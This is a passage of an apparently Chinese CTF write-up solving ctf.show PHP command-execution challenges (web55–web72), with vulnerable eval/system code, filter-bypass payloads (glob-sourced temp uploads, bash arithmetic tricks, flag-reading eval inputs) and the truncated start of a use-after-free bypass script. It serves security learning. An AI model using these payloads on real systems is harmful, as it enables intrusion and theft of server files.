class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030163705319.png\" alt=\"image-20221030163705319\" /></p>\n<h2 id=\"web55\"><a class=\"anchor\" href=\"#web55\">#</a> web55</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>过滤了字母，%</p>\n<p>这里可以利用 Linux 的两个小特性</p>\n<ol>\n<li>shell 下可以通过 &quot;.&quot; 来执行任意脚本文件</li>\n<li>Linux 下文件名支持 glob 通配符代替</li>\n</ol>\n<p>用 &quot;.&quot; file 执行文件是不需要文件有执行权限的，那么怎么能得到一个可控文件呢，很简单，上传一个文件通过临时文件来执行控制文件，这个文件会保存到临时文件下，默认是 /tmp/phpxxxxxx 后 6 位是随机的字母，最后一个一般是大写</p>\n<p>但是这个题过滤了字母，怎么指向文件呢，这就用到第二个特性通配符</p>\n<p>先写一个简单的上传表单上传一个文件</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>X-UA-Compatible<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>IE=edge<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=\\, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Document<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token comment\">&lt;!-- // 上传表单 --></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://84aea9a6-e0af-456f-93a2-9bec25124c84.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>上传<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>然后执行命令</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221030171950597.png\" alt=\"image-20221030171950597\" /></p>\n<h2 id=\"web56\"><a class=\"anchor\" href=\"#web56\">#</a> web56</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031153720300.png\" alt=\"image-20221031153720300\" /></p>\n<p>有改动，但是没影响</p>\n<h2 id=\"web57\"><a class=\"anchor\" href=\"#web57\">#</a> web57</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 还能炫的动吗？</span>\n<span class=\"token comment\">//flag in 36.php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>过滤了一堆东西，想办法构造 36 即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155531713.png\" alt=\"image-20221031155531713\" /></p>\n<p>找数字？这不就有了</p>\n<p><code>$(())</code>  代表做一次运算，因为里面为空，也表示值为 0<br />\n <code>$((~$(())))</code>  对 0 作取反运算，值为 - 1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155740487.png\" alt=\"image-20221031155740487\" /></p>\n<p>接下来开始构造对这个取反获得正数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031155858648.png\" alt=\"image-20221031155858648\" /></p>\n<p>那么接下来构造出 - 37，然后取反就行</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">data <span class=\"token operator\">=</span> <span class=\"token string\">\"$((~$((\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"$((~$(())))\"</span><span class=\"token operator\">*</span><span class=\"token number\">37</span><span class=\"token operator\">+</span><span class=\"token string\">\"))))\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~\n$(())))$((~$(())))$((~$(())))))))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031160201680.png\" alt=\"image-20221031160201680\" /></p>\n<h2 id=\"web58\"><a class=\"anchor\" href=\"#web58\">#</a> web58</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031161118971.png\" alt=\"image-20221031161118971\" /></p>\n<p>我开始还在疑惑怎么没过滤了，原来是开始禁用函数了，禁用了 system 函数，尝试 scandir，将结果输出</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">c&#x3D;var_dump(scandir(&#39;.&#39;));\nc&#x3D;print_r(scandir(&#39;.&#39;));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162334817.png\" alt=\"image-20221031162334817\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nc<span class=\"token operator\">=</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 读文件</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token comment\">// 高亮文件内容</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031162659472.png\" alt=\"image-20221031162659472\" /></p>\n<p>补充：上面的 file 是将文件内容读入到一个数组中</p>\n<h2 id=\"web59\"><a class=\"anchor\" href=\"#web59\">#</a> web59</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>emmmm 没看到加了啥，我都以为我开错环境了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031163958688.png\" alt=\"image-20221031163958688\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">// 通过复制，重命名读取使得文件不能被当作 php 解析</span>\n<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 用法：</span>\n<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          \n<span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web71\"><a class=\"anchor\" href=\"#web71\">#</a> web71</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 你们在炫技吗？</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>使用 ob_get_contents ()，ob_end_clean (); 函数将命令执行的回显，这里也简单，使用 exit () 将后面的部分结束就行。</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 利用原生类</span>\nc<span class=\"token operator\">=</span><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031182645648.png\" alt=\"image-20221031182645648\" /></p>\n<h2 id=\"web72\"><a class=\"anchor\" href=\"#web72\">#</a> web72</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c=?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121152127.png\" alt=\"image-20221101121152127\" /></p>\n<p>看到 flag 在 /flag0.txt，读文件，但是没有权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121324824.png\" alt=\"image-20221101121324824\" /></p>\n<p>使用 uaf 脚本绕过</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$backtrace</span> 